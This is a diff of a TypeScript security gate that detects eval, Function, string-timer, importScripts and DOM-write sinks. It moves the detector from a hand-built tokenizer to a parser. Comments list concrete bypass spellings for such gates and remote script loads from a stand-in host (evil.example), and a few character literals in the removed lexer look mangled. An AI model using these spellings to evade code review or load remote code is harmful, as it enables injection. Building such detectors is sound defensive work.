@@ -1,748 +1,128 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
 //
-// TOKEN-LEVEL detection of dynamic-code sinks, replacing the regex family that
-// preceded it.
+// Dynamic-code sink detection, over the PARSE.
 //
-// WHY THIS EXISTS. The question every dynamic-code gate has to answer is:
+// The question every dynamic-code gate has to answer is: does some expression
+// evaluate to a sink, and is it then INVOKED?  That is a question about binding
+// and about program structure, and it has now been answered three ways here.
 //
-//     does some expression evaluate to a sink, and is it then INVOKED?
+// First by regex, which found a new bypass SPELLING on six consecutive review
+// rounds.  Then by a hand-written token analyzer — a lexer, an expression
+// reader, an alias table, a receiver table — which took FIFTEEN commits, each
+// adding one more case: complete the lexical coverage, resolve sink aliases,
+// follow typed aliases, unwrap parenthesised references, treat `.constructor`
+// as the Function sink, fold constant strings, resolve destructured and
+// object-held sinks, treat an alias of a global receiver as a receiver, resolve
+// sinks held in containers, walk DOM sinks, unblind the shared lexer.  Every
+// one was a real hole and every fix was correct.  The list did not shorten
+// because it was never a list of bugs: it was the JavaScript grammar and its
+// scoping rules, restated by hand next to a compiler that has both.
 //
-// A regex cannot ask that. It can only recognise particular spellings, and the
-// spellings are unbounded — review of PR #169 found a new one on six
-// consecutive rounds:
+// So the source is PARSED, and the compiler answers the two hard parts:
 //
-//     Function.call(…)          →  Function['call'](…)
-//     eval.apply(…)             →  globalThis.Function?.call(…)
-//     Reflect.apply(Function,…) →  Reflect['apply'](Function, …)
-//     setTimeout.call(…)        →  setTimeout['call'](…)
+//   • IS THIS THE GLOBAL?  An identifier is the global `eval` exactly when its
+//     symbol has no declaration in this file.  Scope, shadowing, hoisting,
+//     parameters and imports come with that for free — the token analyzer could
+//     not see `(eval: (s: string) => void) => eval(x)` as a parameter at all.
+//   • WHERE DOES THIS NAME COME FROM?  `const F = Function` is a binding, so
+//     following it is one hop from the symbol to its declaration, not an alias
+//     table maintained beside the scan.
 //
-// Each fix closed one spelling and left the class open, because "reference,
-// then any chain of member accesses, then a call" is a STRUCTURAL property.
-// So this module tokenises instead, and walks that chain. Adding a new access
-// form to JavaScript is the only thing that could reopen it — a new way of
-// SPELLING an existing one cannot, because the walk never enumerates
-// spellings.
+// Two whole layers disappear with the token stream.  It had to run the entire
+// analysis TWICE, under both readings of `/`, because a lexer cannot tell a
+// regex from a division; and it had to re-tokenise every `${…}` span, because a
+// template arrived as one token.  A parser has no ambiguity to hedge, and an
+// interpolation is already a child expression.
 //
-// (The obvious alternative — a real parser — is unavailable: `typescript@7`
-// is the native port and exposes no `createSourceFile`, and this module is
-// deliberately DEPENDENCY-FREE so the `scripts`-rooted vitest project, which
-// resolves no external packages, can unit test it directly.)
+// What is still written out is the part that is genuinely a program analysis
+// rather than a parse: which property of which container holds what.  It is
+// small, it is keyed on SYMBOLS rather than on names, and the copy-on-write
+// behaviour the old table needed a rule for now falls out — `g.zzz` and
+// `self.zzz` are different keys because `g` and `self` are different symbols.
 //
-// WHAT THE TOKENISER FIXES ON ITS OWN. Comments, strings, templates and regex
-// literals are skipped as part of tokenising, so "doctrine discussed in prose"
-// never reaches the walk and no separate comment-stripping pass is needed —
-// which is what previously made a heuristic stripper load-bearing for
-// detection.
+// ONE RULE ABOUT WHICH RESOLVER TO USE, learned three times in one day.
+//
+// `reaches` answers an OPEN question — what values can this expression be —
+// and its callers are the gates, at the leaves.  `flowsInto` is its STEP
+// function, and the questions asked from inside a step are CLOSED: is this
+// receiver the global `Proxy`?  which property access does this callee denote?
+// what string does this name hold?
+//
+// Answering a closed question by running the open search makes the step
+// function depend on the search's own closure.  Each of those three did it, and
+// each cost the same way: a repository scan that took 25 seconds took more than
+// ten minutes, and the URL scan stopped terminating altogether.  Measured, not
+// guessed — the sink scan is linear at ~18ms/file and was never the problem.
+//
+// So a closed question gets a dedicated walk: `globalsBehind`, `accessesBehind`,
+// and the URL scan's own `held`.  They are memoised, linear, and follow exactly
+// what can rename the thing they are about — a binding, a reassignment, an
+// import, a parameter's call sites, a function's returns, a container slot, a
+// selection between any of those.  That is the SAME coverage the open search
+// has for these shapes, computed once instead of re-explored per call; the
+// mistake to avoid is not "a second walk", it is a second walk that knows LESS.
 
-/** A lexical token. `value` is the raw source text of the token. */
-export interface Token {
-  readonly kind: 'ident' | 'punct' | 'string' | 'template' | 'regex' | 'number';
-  /**
-   * For an identifier this is the DECODED name — JavaScript permits Unicode
-   * escapes inside identifiers, so `\u0065val` IS `eval` and must compare equal
-   * to it. For every other kind it is the raw source text.
-   */
-  readonly value: string;
-  readonly start: number;
-  /** Offset just past the token's RAW source text. */
-  readonly end: number;
-}
+import { SyntaxKind } from 'typescript/unstable/ast';
+import type { Project } from 'typescript/unstable/sync';
+import {
+  asNode,
+  lineAt,
+  newlineIndex,
+  type Source,
+  type Syntax,
+  walk,
+  withParsedSources,
+} from './ts-source.js';
+
+export type { Source } from './ts-source.js';
 
 /**
- * Keywords after which a `/` begins a REGEX literal rather than a division.
- * After any other identifier the `/` divides.
+ * A STRING the relation proved, which no node in the source spells.
+ *
+ * `String(payload)` and `x.toString()` produce one, and so does a wrapper that
+ * was handed `String` — the coercion is a fact about the VALUE, not about the
+ * syntax at the call, so a predicate reading nodes alone could never see it.
  */
-const KEYWORDS_BEFORE_REGEX: ReadonlySet<string> = new Set([
-  'return',
-  'typeof',
-  'instanceof',
-  'in',
-  'of',
-  'new',
-  'delete',
-  'void',
-  'throw',
-  'case',
-  'do',
-  'else',
-  'yield',
-  'await',
+export interface CoercedString {
+  readonly coercedString: true;
+}
+
+/** What a sink's code-argument predicate is given: expressions, and coercions. */
+export type SinkValue = Syntax | CoercedString;
+
+const COERCED: CoercedString = { coercedString: true };
+
+/** Methods whose RESULT is a string, whatever they are called on. */
+const STRING_COERCIONS: ReadonlySet<string> = new Set([
+  'toString',
+  'toLocaleString',
+  'stringify',
+  'join',
 ]);
 
-const IDENT_START = /[A-Za-z_$-￿]/;
-const IDENT_PART = /[A-Za-z0-9_$-￿]/;
-
-/**
- * Decode a `\uXXXX` / `\u{X…}` escape at `i`, or return null.
- *
- * Identifier escapes are why this exists: `eval('x')` is a call to `eval`,
- * and a lexer treating the backslash as punctuation would compare the wrong
- * name and let it through.
- */
-function readUnicodeEscape(source: string, i: number): { char: string; end: number } | null {
-  if (source[i] !== '\\' || source[i + 1] !== 'u') return null;
-  if (source[i + 2] === '{') {
-    const close = source.indexOf('}', i + 3);
-    if (close === -1) return null;
-    const hex = source.slice(i + 3, close);
-    if (!/^[0-9A-Fa-f]{1,6}$/.test(hex)) return null;
-    return { char: String.fromCodePoint(Number.parseInt(hex, 16)), end: close + 1 };
-  }
-  const hex = source.slice(i + 2, i + 6);
-  if (!/^[0-9A-Fa-f]{4}$/.test(hex)) return null;
-  return { char: String.fromCharCode(Number.parseInt(hex, 16)), end: i + 6 };
-}
-
-/** Read an identifier (honouring escapes) at `i`; returns its DECODED name. */
-function readIdentifier(source: string, i: number): { name: string; end: number } | null {
-  let k = i;
-  let name = '';
-  while (k < source.length) {
-    const decoded = readUnicodeEscape(source, k);
-    const char = decoded ? decoded.char : (source[k] as string);
-    const ok = name === '' ? IDENT_START.test(char) : IDENT_PART.test(char);
-    if (!ok) break;
-    name += char;
-    k = decoded ? decoded.end : k + 1;
-  }
-  return name === '' ? null : { name, end: k };
-}
-
-/**
- * Lex `source` into tokens, discarding comments and whitespace.
- *
- * `preferRegex` resolves the ONE genuinely undecidable case for a lexer: after
- * `)`, `]`, `}` or a non-keyword identifier, `/` may open a regex
- * (`if (ok) /re/.test(x)`) or divide (`(a) / b`). Telling them apart needs a
- * parser. Callers scan BOTH settings and union the findings, so a wrong guess
- * can hide nothing: whichever way the real code goes, one of the two passes
- * lexes it correctly.
- */
-export function tokenize(
-  source: string,
-  preferRegex = false,
-  options: { readonly from?: number; readonly stopAtUnmatchedBrace?: boolean } = {},
-): Token[] {
-  const tokens: Token[] = [];
-  const n = source.length;
-  let i = options.from ?? 0;
-  // Only meaningful with `stopAtUnmatchedBrace`: the depth of `{` … `}` pairs
-  // seen so far, so the terminator of a template interpolation can be found
-  // without lexing the rest of the file.
-  let braceDepth = 0;
-
-  /** The last token that can decide whether a `/` opens a regex. */
-  const previous = (): Token | undefined => tokens[tokens.length - 1];
-
-  const opensRegex = (): boolean => {
-    const prev = previous();
-    if (!prev) return true;
-    if (prev.kind === 'ident') {
-      return KEYWORDS_BEFORE_REGEX.has(prev.value) ? true : preferRegex;
-    }
-    // A value-producing token cannot be followed by a regex.
-    if (prev.kind === 'string' || prev.kind === 'template' || prev.kind === 'number') {
-      return false;
-    }
-    if (prev.kind === 'regex') return false;
-    // Punctuation: `)`, `]`, `}` and the postfix operators end a value.
-    if (prev.value === ')' || prev.value === ']' || prev.value === '}') return preferRegex;
-    if (prev.value === '++' || prev.value === '--') return false;
-    return true;
-  };
-
-  /** Consume a `'`/`"` string starting at `i`; returns the end offset. */
-  const readQuoted = (quote: string): number => {
-    let k = i + 1;
-    while (k < n) {
-      const c = source[k] as string;
-      if (c === '\\') {
-        k += 2;
-        continue;
-      }
-      if (c === quote) return k + 1;
-      // An unterminated literal must not swallow the rest of the file.
-      if (c === '\n') return k;
-      k += 1;
-    }
-    return n;
-  };
-
-  /** Consume a template literal (with `${…}` nesting) starting at `i`. */
-  const readTemplate = (): number => {
-    let k = i + 1;
-    let depth = 0;
-    while (k < n) {
-      const c = source[k] as string;
-      if (c === '\\') {
-        k += 2;
-        continue;
-      }
-      if (depth === 0 && c === '`') return k + 1;
-      if (depth === 0 && c === '$' && source[k + 1] === '{') {
-        depth = 1;
-        k += 2;
-        continue;
-      }
-      if (depth > 0) {
-        // Inside `${…}`: track braces, and skip nested strings/templates so a
-        // brace or backtick inside one cannot end the interpolation early.
-        if (c === '{') depth += 1;
-        else if (c === '}') depth -= 1;
-        else if (c === '"' || c === "'") {
-          const saved = i;
-          i = k;
-          k = readQuoted(c);
-          i = saved;
-          continue;
-        } else if (c === '`') {
-          const saved = i;
-          i = k;
-          k = readTemplate();
-          i = saved;
-          continue;
-        }
-      }
-      k += 1;
-    }
-    return n;
-  };
-
-  /** Consume a regex literal starting at `i`; returns the end offset. */
-  const readRegex = (): number => {
-    let k = i + 1;
-    let inClass = false;
-    while (k < n) {
-      const c = source[k] as string;
-      if (c === '\\') {
-        k += 2;
-        continue;
-      }
-      if (c === '\n') return k; // unterminated
-      if (c === '[') inClass = true;
-      else if (c === ']') inClass = false;
-      else if (c === '/' && !inClass) {
-        k += 1;
-        while (k < n && IDENT_PART.test(source[k] as string)) k += 1; // flags
-        return k;
-      }
-      k += 1;
-    }
-    return n;
-  };
-
-  while (i < n) {
-    const c = source[i] as string;
-
-    if (c === ' ' || c === '\t' || c === '\r' || c === '\n' || c === '\f' || c === '\v') {
-      i += 1;
-      continue;
-    }
-    // Comments are DISCARDED here, which is why no separate strip pass is
-    // needed for detection: prose can never reach the walk.
-    if (c === '/' && source[i + 1] === '/') {
-      const nl = source.indexOf('\n', i);
-      i = nl === -1 ? n : nl;
-      continue;
-    }
-    if (c === '/' && source[i + 1] === '*') {
-      const close = source.indexOf('*/', i + 2);
-      i = close === -1 ? n : close + 2;
-      continue;
-    }
-    if (c === '"' || c === "'") {
-      const end = readQuoted(c);
-      tokens.push({ kind: 'string', value: source.slice(i, end), start: i, end });
-      i = end;
-      continue;
-    }
-    if (c === '`') {
-      const end = readTemplate();
-      tokens.push({ kind: 'template', value: source.slice(i, end), start: i, end });
-      i = end;
-      continue;
-    }
-    if (c === '/' && opensRegex()) {
-      const end = readRegex();
-      tokens.push({ kind: 'regex', value: source.slice(i, end), start: i, end });
-      i = end;
-      continue;
-    }
-    const identifier = readIdentifier(source, i);
-    if (identifier) {
-      tokens.push({ kind: 'ident', value: identifier.name, start: i, end: identifier.end });
-      i = identifier.end;
-      continue;
-    }
-    if (/[0-9]/.test(c)) {
-      let k = i;
-      while (k < n && /[0-9a-fA-FxXoObBeE._n]/.test(source[k] as string)) k += 1;
-      tokens.push({ kind: 'number', value: source.slice(i, k), start: i, end: k });
-      i = k;
-      continue;
-    }
-    // Punctuation. Only the multi-character forms the walk cares about need to
-    // be lexed as single tokens.
-    const three = source.slice(i, i + 3);
-    const two = source.slice(i, i + 2);
-    if (three === '**=' || three === '...' || three === '===' || three === '!==') {
-      tokens.push({ kind: 'punct', value: three, start: i, end: i + 3 });
-      i += 3;
-      continue;
-    }
-    if (two === '?.' || two === '++' || two === '--' || two === '=>' || two === '?？') {
-      tokens.push({ kind: 'punct', value: two, start: i, end: i + 2 });
-      i += 2;
-      continue;
-    }
-    if (options.stopAtUnmatchedBrace && (c === '{' || c === '}')) {
-      if (c === '}' && braceDepth === 0) {
-        // The interpolation's terminator. Pushed so the caller can read its
-        // offset, then the scan stops — this is what keeps span-finding linear.
-        tokens.push({ kind: 'punct', value: c, start: i, end: i + 1 });
-        return tokens;
-      }
-      braceDepth += c === '{' ? 1 : -1;
-    }
-    tokens.push({ kind: 'punct', value: c, start: i, end: i + 1 });
-    i += 1;
-  }
-  return tokens;
-}
-
-/** Is `t` the punctuation `value`? */
-const isPunct = (t: Token | undefined, value: string): boolean =>
-  t?.kind === 'punct' && t.value === value;
-
-/** Decode the escape sequences inside a string/template BODY. */
-function decodeStringBody(body: string): string {
-  let out = '';
-  let i = 0;
-  const SIMPLE: Record<string, string> = {
-    n: '\n',
-    t: '\t',
-    r: '\r',
-    b: '\b',
-    f: '\f',
-    v: '\v',
-    '0': '\0',
-  };
-  while (i < body.length) {
-    if (body[i] !== '\\') {
-      out += body[i];
-      i += 1;
-      continue;
-    }
-    const decoded = readUnicodeEscape(body, i);
-    if (decoded) {
-      out += decoded.char;
-      i = decoded.end;
-      continue;
-    }
-    const hex = /^x([0-9A-Fa-f]{2})/.exec(body.slice(i + 1));
-    if (hex?.[1]) {
-      out += String.fromCharCode(Number.parseInt(hex[1], 16));
-      i += 1 + hex[0].length;
-      continue;
-    }
-    const next = body[i + 1] ?? '';
-    // A LINE CONTINUATION — a backslash immediately before a line terminator —
-    // contributes NOTHING to the string. `'https:\<newline>//evil/x.js'` is
-    // the single URL `https://evil/x.js` at runtime, so keeping the newline
-    // would stop the remote scheme from being recognised.
-    if (next === '\n' || next === '\u2028' || next === '\u2029') {
-      i += 2;
-      continue;
-    }
-    if (next === '\r') {
-      i += body[i + 2] === '\n' ? 3 : 2;
-      continue;
-    }
-    out += SIMPLE[next] ?? next;
-    i += 2;
-  }
-  return out;
-}
-
-/**
- * The decoded content of a string token, or `null` when it is not a string.
- *
- * A template WITH interpolations has no single value, so this returns null for
- * it — callers that only need the static head use {@link stringPrefix}.
- */
-export function stringValue(t: Token | undefined): string | null {
-  if (!t) return null;
-  if (t.kind === 'string') return decodeStringBody(t.value.slice(1, -1));
-  // A template with no substitution is a string literal for our purposes.
-  if (t.kind === 'template' && !t.value.includes('${')) {
-    return decodeStringBody(t.value.slice(1, -1));
-  }
-  return null;
-}
-
-/** Is this token a STRING VALUE — a quoted literal or ANY template literal? */
-export function isStringToken(t: Token | undefined): boolean {
-  return t?.kind === 'string' || t?.kind === 'template';
-}
-
-/**
- * The STATIC leading text of a string token: a whole quoted literal, or a
- * template's head up to its first interpolation.
- *
- * `\`https://evil.example/${name}.js\`` is still a remote URL — the scheme and
- * host are fixed and only the path varies — so a check that rejected every
- * interpolated template would miss it.
- */
-export function stringPrefix(t: Token | undefined): string | null {
-  if (!t) return null;
-  if (t.kind === 'string') return decodeStringBody(t.value.slice(1, -1));
-  if (t.kind !== 'template') return null;
-  const body = t.value.slice(1, t.value.endsWith('`') ? -1 : undefined);
-  const interpolation = body.indexOf('${');
-  return decodeStringBody(interpolation === -1 ? body : body.slice(0, interpolation));
-}
-
-/**
- * The value of a constant STRING EXPRESSION — a `+` chain over string and
- * template literals and parenthesised sub-expressions.
- *
- * Every predicate below used to read only `arg[0]`, which made concatenation a
- * universal bypass: `importScripts('ht' + 'tps://evil/x.js')` loads exactly the
- * same cross-origin script as the whole literal, and `globalThis['ev' + 'al']`
- * reaches exactly the same sink as `globalThis['eval']`. Whether the pieces are
- * written apart or together is a SPELLING, so it is folded once, here, and
- * every caller shares the result.
- *
- * `prefix` is the longest statically-known LEADING text — folding stops at the
- * first operand whose value is unknown (an identifier, a call, a template
- * interpolation), because everything after it could be anything. `complete`
- * says nothing was elided, which is what a whole-value comparison needs.
- * `isString` says the expression evaluates to a string at all: JavaScript `+`
- * yields a string whenever either operand is one, so a single string anywhere
- * in the chain is enough — that is what makes `setTimeout(prefix + 'evil()')`
- * the implicit-eval form even though it does not begin with a literal.
- */
-interface FoldedString {
-  readonly prefix: string;
-  readonly complete: boolean;
-  readonly isString: boolean;
-}
-
-/** Split `tokens` on top-level `+`, ignoring `+` inside any bracket group. */
-function additionOperands(tokens: readonly Token[]): Token[][] {
-  const operands: Token[][] = [];
-  let current: Token[] = [];
-  let depth = 0;
-  for (const t of tokens) {
-    if (t.kind === 'punct') {
-      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-      else if (t.value === '+' && depth === 0) {
-        operands.push(current);
-        current = [];
-        continue;
-      }
-    }
-    current.push(t);
-  }
-  operands.push(current);
-  return operands;
-}
-
-function foldString(tokens: readonly Token[], depth = 0): FoldedString {
-  if (tokens.length === 0 || depth > 16) return { prefix: '', complete: false, isString: false };
-  const operands = additionOperands(tokens);
-
-  let prefix = '';
-  let complete = true;
-  let isString = false;
-  for (const operand of operands) {
-    // A fully parenthesised operand is the same expression one level in.
-    const inner =
-      operand.length > 1 && isPunct(operand[0], '(') && matchGroup(operand, 0) === operand.length
-        ? foldString(operand.slice(1, -1), depth + 1)
-        : null;
-    const part =
-      inner ??
-      (operand.length === 1 && isStringToken(operand[0])
-        ? {
-            prefix: stringPrefix(operand[0]) ?? '',
-            complete: stringValue(operand[0]) !== null,
-            isString: true,
-          }
-        : { prefix: '', complete: false, isString: false });
-
-    if (part.isString) isString = true;
-    if (complete) prefix += part.prefix;
-    if (!part.complete) complete = false;
-  }
-  return { prefix, complete, isString };
-}
-
-/** Global objects through which a sink can be reached by property access. */
-const GLOBAL_RECEIVERS: ReadonlySet<string> = new Set(['globalThis', 'window', 'self']);
-
-/**
- * The property name inside a computed access `[ … ]` opened at `open`, or null.
- * The subscript is FOLDED, so `['ev' + 'al']` names `eval`.
- */
-function computedName(
-  tokens: readonly Token[],
-  open: number,
-): { name: string; next: number } | null {
-  const end = matchGroup(tokens, open);
-  if (end === -1) return null;
-  const inner = tokens.slice(open + 1, end - 1);
-  const folded = foldString(inner);
-  if (folded.complete && folded.isString) return { name: folded.prefix, next: end };
-  // A NUMERIC subscript names the same property a string one does — every
-  // JavaScript property key IS a string, so `a[0]` is exactly `a['0']`. That
-  // is what lets an ARRAY element be reached by the same lookup an object
-  // property is, rather than needing a parallel mechanism for arrays.
-  const only = inner.length === 1 ? inner[0] : undefined;
-  if (only?.kind === 'number') {
-    const value = Number(only.value);
-    if (Number.isFinite(value)) return { name: String(value), next: end };
-  }
-  return null;
-}
-
-/**
- * Read a member access at `i` — `.name`, `?.name`, `['name']`, `?.['name']`.
- * Returns the accessed name and the index after it, or `null`.
- */
-function readMember(tokens: readonly Token[], i: number): { name: string; next: number } | null {
-  let k = i;
-  if (isPunct(tokens[k], '?.')) k += 1;
-  else if (isPunct(tokens[k], '.')) k += 1;
-  else if (isPunct(tokens[k], '[')) return computedName(tokens, k);
-  else return null;
-
-  if (isPunct(tokens[k], '[')) return computedName(tokens, k);
-  const t = tokens[k];
-  if (t?.kind === 'ident') return { name: t.value, next: k + 1 };
-  return null;
-}
-
-/**
- * Does `token` end an expression, so that a following `.`/`?.`/`[` is a MEMBER
- * ACCESS on it rather than the start of something new?
- *
- * `}` counts: `const f = function(){}.constructor('code')` is a member access
- * on a function expression.
- */
-function endsExpression(token: Token | undefined): boolean {
-  if (!token) return false;
-  if (token.kind === 'punct')
-    return token.value === ')' || token.value === ']' || token.value === '}';
-  return true;
-}
-
-/**
- * Skip the parentheses wrapping a reference expression at `i`, returning the
- * index where the reference itself starts.
- *
- * `(Function)` is `Function`, `((Function))` is `Function`, and a SEQUENCE
- * expression `(0, Function)` evaluates to its LAST operand — so all three are
- * the same reference with punctuation around it. The scan loop already knew
- * this about a reference in call position; every place that resolves a
- * reference from an INITIALIZER or an ARGUMENT resolved it from the `(`
- * instead, where no identifier is found. One helper, applied at each of them,
- * keeps the four sites from drifting apart again.
- */
-function unwrapReference(tokens: readonly Token[], i: number): number {
-  let k = i;
-  for (let steps = 0; steps < 16; steps += 1) {
-    if (!isPunct(tokens[k], '(')) return k;
-    const end = matchGroup(tokens, k);
-    if (end === -1) return k;
-    let last = k + 1;
-    let depth = 0;
-    for (let j = k + 1; j < end - 1; j += 1) {
-      const t = tokens[j];
-      if (t?.kind !== 'punct') continue;
-      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-      else if (t.value === ',' && depth === 0) last = j + 1;
-    }
-    k = last;
-  }
-  return k;
-}
-
-/** Index just past the group opened at `open` (`(`, `[` or `{`), or -1. */
-function matchGroup(tokens: readonly Token[], open: number): number {
-  const pairs: Record<string, string> = { '(': ')', '[': ']', '{': '}' };
-  const openTok = tokens[open];
-  if (openTok?.kind !== 'punct') return -1;
-  const close = pairs[openTok.value];
-  if (!close) return -1;
-  let depth = 0;
-  for (let k = open; k < tokens.length; k += 1) {
-    const t = tokens[k];
-    if (t?.kind !== 'punct') continue;
-    if (t.value === openTok.value) depth += 1;
-    else if (t.value === close) {
-      depth -= 1;
-      if (depth === 0) return k + 1;
-    }
-  }
-  return -1;
-}
-
-/**
- * Split the argument list of the call opened at `open` into per-argument token
- * runs, at top level only.
- */
-function callArguments(tokens: readonly Token[], open: number): Token[][] {
-  const end = matchGroup(tokens, open);
-  if (end === -1) return [];
-  const args: Token[][] = [];
-  let current: Token[] = [];
-  let depth = 0;
-  for (let k = open + 1; k < end - 1; k += 1) {
-    const t = tokens[k] as Token;
-    if (t.kind === 'punct') {
-      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-      else if (t.value === ',' && depth === 0) {
-        args.push(current);
-        current = [];
-        continue;
-      }
-    }
-    current.push(t);
-  }
-  if (current.length > 0) args.push(current);
-  return args;
-}
-
-/** How a sink's arguments are judged once an invocation is found. */
+/** A globally-named dynamic-code sink. */
 export interface SinkSpec {
   /** The identifier that names the sink (`eval`, `Function`, `setTimeout`, …). */
   readonly name: string;
   /** Human label the gates wrap in their own phrasing. */
   readonly label: string;
   /**
-   * Predicate on the CODE argument. Omitted ⇒ any invocation is a sink
-   * (`eval`/`Function` evaluate whatever they are given). Supplied ⇒ the
+   * Predicate on the CODE argument.  Omitted ⇒ any invocation is a sink
+   * (`eval`/`Function` evaluate whatever they are given).  Supplied ⇒ the
    * argument must satisfy it, which is how `setTimeout(fn, 0)` stays clean
    * while `setTimeout('code', 0)` does not.
    */
-  readonly codeArgument?: (arg: readonly Token[]) => boolean;
+  readonly codeArgument?: (values: readonly SinkValue[]) => boolean;
   /**
    * The sink takes an UNBOUNDED list of code arguments, so `codeArgument` is
-   * tested against EVERY one of them and any match fires.
-   *
-   * `importScripts` is the case: it loads each URL it is given, so
-   * `importScripts('/local.js', 'https://evil.example/x.js')` fetches remote
-   * code even though its first argument is same-origin. Judging only the first
-   * argument was a REGRESSION against the whole-call text scan this module
-   * replaced — the one thing the structural rewrite was not allowed to lose.
+   * tested against every one of them and any match fires.  `importScripts`
+   * loads each URL it is handed, so judging only the first would clear
+   * `importScripts('/local.js', 'https://evil.example/x.js')`.
    */
   readonly variadic?: boolean;
 }
 
-/**
- * The code argument is a STRING — the implicit-eval timer form.
- *
- * An INTERPOLATED template counts: `setTimeout(\`evil(${v})\`, 0)` is still a
- * string the host compiles, so requiring a fully static literal would miss the
- * form an attacker is most likely to use.
- */
-export const isStringLiteral = (arg: readonly Token[]): boolean => foldString(arg).isString;
-
-/**
- * The code argument is a statically known URL that is NOT same-origin.
- *
- * An ALLOWLIST, not a denylist of remote schemes. Listing the bad schemes is
- * the enumerate-the-spellings mistake in another costume: `http(s)://` and
- * protocol-relative `//` were listed, so `data:text/javascript,…`,
- * `blob:`, `javascript:` and `file:` all read as same-origin and loaded
- * executable code past the gate. What the gate actually enforces is
- * "same-origin imports only", and the same-origin forms are the CLOSED set —
- * a relative reference, with no scheme and no authority. Everything else is
- * rejected, including schemes that do not exist yet.
- *
- * A non-static argument yields `false`: the gate cannot evaluate
- * `importScripts(url)` and does not pretend to. The CSP is the runtime half.
- *
- * URL-parser quirks are normalised first, because the browser normalises them
- * too and a check that skipped it would be reading a different URL than the
- * one that gets fetched: tabs and newlines are STRIPPED anywhere in a URL, and
- * leading control characters and spaces are trimmed, so `'ht\ttps://evil/x.js'`
- * fetches `https://evil/x.js`. A leading `\` is a `/` for a special scheme, so
- * `\\evil.example/x.js` is protocol-relative just as `//evil.example/x.js` is.
- */
-export const isNonSameOriginUrl = (arg: readonly Token[]): boolean => {
-  const { prefix, isString } = foldString(arg);
-  if (!isString) return false;
-  // Written without a control-character regex class (which the linter forbids,
-  // rightly - they are unreadable) but doing exactly what the URL parser does.
-  const stripped = [...prefix].filter((c) => c !== '\t' && c !== '\n' && c !== '\r').join('');
-  let from = 0;
-  while (from < stripped.length && (stripped.codePointAt(from) ?? 0x21) <= 0x20) from += 1;
-  const url = stripped.slice(from);
-  if (/^[/\\]{2}/.test(url)) return true; // protocol-relative (either slash)
-  return /^[A-Za-z][A-Za-z0-9+.-]*:/.test(url); // ANY scheme is off-origin
-};
-
-/**
- * The `${…}` interpolation bodies of a template literal, with the absolute
- * offset of each. Nested templates, strings and braces are skipped so a `}`
- * inside one cannot end the span early.
- */
-/**
- * The `${…}` interpolation bodies of a template literal, with the absolute
- * offset of each.
- *
- * The matching `}` is found by TOKENISING the span, not by counting braces:
- * a hand-rolled counter is a second, weaker lexer, and it read the `}` inside
- * a regex literal (`${/}/.test(x); eval(p)}`) as the end of the span. Reusing
- * the one tokeniser means regex literals, strings, templates and comments are
- * all handled by the code that already gets them right.
- */
-function interpolationSpans(
-  raw: string,
-  base: number,
-  preferRegex: boolean,
-): Array<{ text: string; offset: number }> {
-  const spans: Array<{ text: string; offset: number }> = [];
-  let i = 1; // past the opening backtick
-  while (i < raw.length) {
-    if (raw[i] === '\\') {
-      i += 2;
-      continue;
-    }
-    if (raw[i] === '`') break; // the template's own closing backtick
-    if (raw[i] === '$' && raw[i + 1] === '{') {
-      const start = i + 2;
-      // Lex FROM `start` and stop at the terminator, rather than slicing and
-      // re-lexing the whole remaining template for every interpolation — that
-      // was O(n²) in the number of spans, which the performance canary caught.
-      const tokens = tokenize(raw, preferRegex, { from: start, stopAtUnmatchedBrace: true });
-      const last = tokens[tokens.length - 1];
-      const end = last && last.kind === 'punct' && last.value === '}' ? last.start : raw.length; // unterminated: take the rest
-      spans.push({ text: raw.slice(start, end), offset: base + start });
-      i = end + 1;
-      continue;
-    }
-    i += 1;
-  }
-  return spans;
-}
-
-/**
- * A DOM sink named by a PROPERTY rather than by a global: `x.innerHTML = …`,
- * `document.write(…)`.
- *
- * These were patterns (`/\.innerHTML\s*=/`) on the theory that a DOM sink has
- * no call chain to walk. That was wrong in both directions: `document['write']`
- * IS a member access with a call, and `node['innerHTML'] = payload` assigns the
- * same property the dotted spelling does — so both walked past a
- * merge-blocking XSS gate. Reading them here means they get the same
- * member-name folding (`['inner' + 'HTML']`) every other lookup gets.
- */
+/** A sink named by a PROPERTY rather than by a global. */
 export interface MemberSinkSpec {
   /** The identifier the property must hang off, or undefined for ANY receiver. */
   readonly receiver?: string;
@@ -752,61 +132,6 @@ export interface MemberSinkSpec {
   readonly label: string;
 }
 
-/** Find uses of member-named DOM sinks, in every access spelling. */
-export function findMemberSinkUses(
-  source: string,
-  specs: readonly MemberSinkSpec[],
-): SinkFinding[] {
-  const byKey = new Map<string, SinkFinding>();
-  const lineStarts: number[] = [0];
-  for (let k = 0; k < source.length; k += 1) if (source[k] === '\n') lineStarts.push(k + 1);
-  const lineOf = (offset: number): number => {
-    let lo = 0;
-    let hi = lineStarts.length - 1;
-    while (lo < hi) {
-      const mid = (lo + hi + 1) >> 1;
-      if ((lineStarts[mid] as number) <= offset) lo = mid;
-      else hi = mid - 1;
-    }
-    return lo + 1;
-  };
-
-  for (const preferRegex of [false, true]) {
-    const tokens = tokenize(source, preferRegex);
-    for (let i = 0; i < tokens.length; i += 1) {
-      if (!endsExpression(tokens[i - 1])) continue;
-      const member = readMember(tokens, i);
-      if (!member) continue;
-      for (const spec of specs) {
-        if (spec.property !== member.name) continue;
-        if (spec.receiver !== undefined) {
-          const receiver = tokens[i - 1];
-          if (receiver?.kind !== 'ident' || receiver.value !== spec.receiver) continue;
-        }
-        const next = tokens[member.next];
-        const after = tokens[member.next + 1];
-        const matched =
-          spec.form === 'call'
-            ? isPunct(next, '(') || (isPunct(next, '?.') && isPunct(after, '('))
-            : // `=` but not `==`/`===`, or the compound `+=` (which appends
-              // markup just as destructively as a plain assignment does).
-              (isPunct(next, '=') && !isPunct(after, '=')) ||
-              (isPunct(next, '+') && isPunct(after, '='));
-        if (!matched) continue;
-        const startTok = tokens[i - 1] as Token;
-        const endTok = tokens[Math.min(member.next + 1, tokens.length) - 1] ?? startTok;
-        const finding: SinkFinding = {
-          label: spec.label,
-          line: lineOf(startTok.start),
-          text: source.slice(startTok.start, endTok.end).replace(/\s+/g, ' ').trim(),
-        };
-        byKey.set(`${finding.line}:${finding.label}`, finding);
-      }
-    }
-  }
